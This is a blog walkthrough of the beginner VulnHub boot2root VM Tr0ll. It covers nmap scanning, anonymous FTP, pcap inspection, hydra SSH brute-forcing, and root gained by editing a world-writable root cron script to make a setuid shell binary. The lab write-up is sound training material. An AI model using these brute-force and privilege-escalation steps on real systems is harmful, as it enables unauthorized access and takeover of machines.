---
categories:
- CTF
- Vulnerable VM
- Solution
- Challenge
- VulnHub
comments: true
date: 2014-08-15T07:12:03Z
title: taming the troll
---

## foreword
Having recently started the road to [OSCP](http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/), [@Maleus21](https://twitter.com/Maleus21) released [Tr0ll](http://vulnhub.com/entry/tr0ll-1,100/) on [@VulnHub](https://twitter.com/VulnHub). I figured since the description was _Difficulty: Beginner ; Type: boot2root_, I could give it a smash in a evening as a bit of distraction.

<!--more-->

## nomad, promise
As usual, I downloaded the VM, extracted the `.rar` and slapped it in Virtual Box. I got the IP 192.168.56.101. Promptly a NMAP was run against it:

```bash
root@kali:~# nmap -v --reason -sV 192.168.56.101 -p-

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.2
22/tcp open  ssh     syn-ack (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
```

So, `ssh`, `ftp`, and `http`. Naturally my first reaction was to inspect the web service.

{{< figure src="/images/troll_web.png" >}}

The `robots.txt` file revealed:

```text
User-agent:*
Disallow: /secret
```

Browsing to `/secret` revealed yet another _interesting_ piece of art:

{{< figure src="/images/troll_secret_path.png" >}}

Right... A little early to be 'mad', but nonetheless, lets move on.

## anonny-mouse ftp
A quick and lazy google for `vsftpd 3.0.2 exploit` didn't reveal anything interesting on page 1, so I lost interest pretty fast. I figured I can just try my luck and attempt to login to the FTP service with anonymous creds:

```bash
root@kali:~# ftp 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 3.0.2)
Name (192.168.56.101:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
500 Illegal PORT command.
ftp: bind: Address already in use

ftp> passive
Passive mode on.

ftp> ls
227 Entering Passive Mode (192,168,56,101,231,190)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10 00:43 lol.pcap
226 Directory send OK.

ftp> get lol.pcap
local: lol.pcap remote: lol.pcap
227 Entering Passive Mode (192,168,56,101,189,113)
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
226 Transfer complete.
8068 bytes received in 0.00 secs (21294.3 kB/s)

ftp> bye
221 Goodbye.
```

Well that worked, and showed that we have a file `lol.pcap` to look at. Interesting. I fired up wireshark and opened the pcap. Following the TCP streams it looked like in a previous session there was activity with a file called `secret_stuff.txt` that is no longer available. I filtered out that stream and continued down the rabbit hole, until I saw the message:

{{< figure src="/images/troll_pcap.png" >}}

Ok. Well. I tried a few things after this, until eventually I figured it may be a web path. Sooo, off to the website we went and browsed to http://192.168.56.101/sup3rs3cr3tdirlol/. In this path there was a binary  called `roflmao`. I downloaded the bin and did some static analysis (paranoid and all that) to see if I can figure out what it does before running it. Eventually I just made it executable and ran it:

```bash
root@kali:~# wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
--2014-08-15 07:57:56--  http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7296 (7.1K)
Saving to: `roflmao'

100%[======>] 7,296       --.-K/s   in 0s

2014-08-15 07:57:56 (826 MB/s) - `roflmao' saved [7296/7296]

root@kali:~/Desktop/Tr0ll# chmod +x roflmao
root@kali:~/Desktop/Tr0ll# ./roflmao
Find address 0x0856BF to proceed
```

Nice. `0x0856BF` is not exactly helpful. But what does it mean? From the previous analysis I have done it also looked like the bin is really just printing the string as can be seen above. After some poking around and exchanging ideas with [@barrebas](https://twitter.com/barrebas) on IRC, I remembered that the previous vague hint was a directory on the web site. So, I tried http://192.168.56.101/0x0856BF/:

{{< figure src="/images/troll_0x856bf.png" >}}

## nohydraplz

Cool! At this stage I was pretty sure there was not much left to gain shell. The folder `good_luck` had a file called `which_one_lol.txt` with contents:

```text
maleus
ps-aux
felux
Eagle11
genphlux < -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
```

List of passwords? Dunno. The folder `this_folder_contains_the_password` had a file `Pass.txt` with contents:

```text
Good_job_:)
```

At this stage I figured this had to be either a nicely provided wordlist for some `hydra` action on the `ftp` || `ssh` service. So naturally, I copied the information to a file called `list.txt` (also made a copy of the `genphlux` word so that its on its own line), and fired up hydra on `ssh`:

```bash
root@kali:~# hydra -v -V -u -L list -P list -t 1 -u 192.168.56.101 ssh
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

[DATA] attacking service ssh on port 22
[VERBOSE] Resolving addresses ... done
[ATTEMPT] target 192.168.56.101 - login "maleus" - pass "maleus" - 1 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login "ps-aux" - pass "maleus" - 2 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login "felux" - pass "maleus" - 3 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login "Eagle11" - pass "maleus" - 4 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login "genphlux < -- Definitely not this one" - pass "maleus" - 5 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login "genphlux" - pass "maleus" - 6 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login "usmc8892" - pass "maleus" - 7 of 169 [child 0]

[ERROR] could not connect to target port 22
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.56.101 - login "usmc8892" - pass "maleus" - 7 of 169 [child 0]

[ERROR] could not connect to target port 22
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.56.101 - login "usmc8892" - pass "maleus" - 7 of 169 [child 0]
```

Err, the sudden errors only meant one thing... `fail2ban`.

```bash
root@kali:~# nmap -v --reason -Pn 192.168.56.101 -p 22

PORT   STATE    SERVICE REASON
22/tcp filtered ssh     no-response

```

So, this was the first part that frustrated me and had me going _"seriously... :\"_. Maybe this was actually a list of `ftp` creds? Sadly, that did not seem to be the case either. And so I was stuck once again. Hydra was slowly trickling on once the ssh service was unbanned again, but it was annoying as heck.

## first shell
I kept bouncing the VM to get the ssh service back faster, allowing hydra to do it's `thing`. Eventually, it was apparent that none of these words as a username/password combination was the correct one.

Returning to the web interface and the word lists, I realized (with some subtle hints and reminders from @barrebas to *read* everything), that the password may be in this folder (`this_folder_contains_the_password`). Get it, the `Pass.txt` is the password...

Right, so I changed `hydra` slightly to use `Pass.txt` as a password and continued to brute with the original `list.txt` as usernames:


```bash
root@kali:~# hydra -v -V -u -L list -p "Pass.txt" -t 1 -u 192.168.56.101 ssh
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

[DATA] 1 task, 1 server, 13 login tries (l:13/p:1), ~13 tries per task
[DATA] attacking service ssh on port 22
[VERBOSE] Resolving addresses ... done
[ATTEMPT] target 192.168.56.101 - login "maleus" - pass "Pass.txt" - 1 of 13 [child 0]
[ATTEMPT] target 192.168.56.101 - login "ps-aux" - pass "Pass.txt" - 2 of 13 [child 0]
[ATTEMPT] target 192.168.56.101 - login "felux" - pass "Pass.txt" - 3 of 13 [child 0]
[...]
[22][ssh] host: 192.168.56.101   login: overflow   password: Pass.txt
```

Yay `overflow:Pass.txt` should get us a session via ssh:

```bash
root@kali:~/Desktop/Tr0ll# ssh overflow@192.168.56.101
overflow@192.168.56.101's password:
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

[...]

Could not chdir to home directory /home/overflow: No such file or directory
$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
```

## ... and root
And so it was time for classic enumeration again. The first _strange_ thing was the fact that it appeared as if all the `/home` directories apart from `/home/troll` was deleted. Weird. Other than that, there were a whole bunch of users according to `/etc/passwd`, and I can't run anything as `root` via `sudo`.

There was a file in `/opt/` called `lmao.py`, however I did not have access to read it. Soooo, more enumeration.

*suddenly*

```bash
Broadcast Message from root@trol
        (somewhere) at 16:05 ...

TIMES UP LOL!

Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
root@kali:~#
```

Urgh. Turns out, something is killing my ssh session every 5 minutes. **Oh my word**, was that annoying. I could handle everything the VM's offered, but this was probably the worst part of it.

Eventually, I was searching for executable files on the filesystem. I was filtering out a large chunk and gradually paging though results to find that odd one out. To help filter out uninteresting stuff, it looked like the VM was built in August, so I just grep for that in the results, hoping that the _thing_ I should be finding has a more recent timestamp:

```bash
overflow@troll:/$ find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug

-rwxrwxrwx 1 root  root    145 Aug 14 13:11 /lib/log/cleaner.py
-rwx--x--x 1 root  root    117 Aug 10 02:11 /opt/lmao.py
-rwxr-xr-x 1 root  root   2.4K Aug 27  2013 /sbin/installkernel
-rwxrwxrwx 1 troll root   7.9K Aug 10 00:43 /srv/ftp/lol.pcap
```

A few interesting results came from that, however, the one that held the golden nugget was `/lib/log/cleaner.py`. During my enumeration I noticed that `/tmp` got cleaned out at a really strange time as I was still trying to `less` a file in there, however, it just _disappeared_.

Anyways, as `cleaner.py` was owned by root and running `os.system`, I just modified it to prepare me a classic `getroot` binary:

```python
#!/usr/bin/env python
import os
import sys
try:
    os.system('chown root:root /var/tmp/getroot; chmod 4755 /var/tmp/getroot ')
except:
    sys.exit()
```

I waited for that annoying 'Times UP' message, and inspected `/var/tmp`:

```bash
overflow@troll:/$ ls -lah /var/tmp/
total 24K
drwxrwxrwt  2 root     root     4.0K Aug 14 13:11 .
drwxr-xr-x 12 root     root     4.0K Aug 10 03:56 ..
-rwxrwxrwx  1 root     root       34 Aug 13 01:16 cleaner.py.swp
-rwsr-xr-x  1 root     root     7.2K Aug 14 13:09 getroot
-rw-rw-r--  1 overflow overflow   71 Aug 14 13:09 sh.c

overflow@troll:/$ /var/tmp/getroot
#
# id
uid=0(root) gid=1002(overflow) groups=0(root),1002(overflow)

# ls /root
proof.txt

# cat /root/proof.txt
Good job, you did it!


702a8c18d29c6f3ca0d99ef5712bfbdc
#
```

## for the curious
That really annoying session that keeps dying? Turns out its `/opt/lmao.py` to blame:

```python
# cat /opt/lmao.py
#!/usr/bin/env python
import os

os.system('echo "TIMES UP LOL!"|wall')
os.system("pkill -u 'overflow'")
sys.exit()

#
```

Thanks [@maleus21](https://twitter.com/maleus21) for the VM!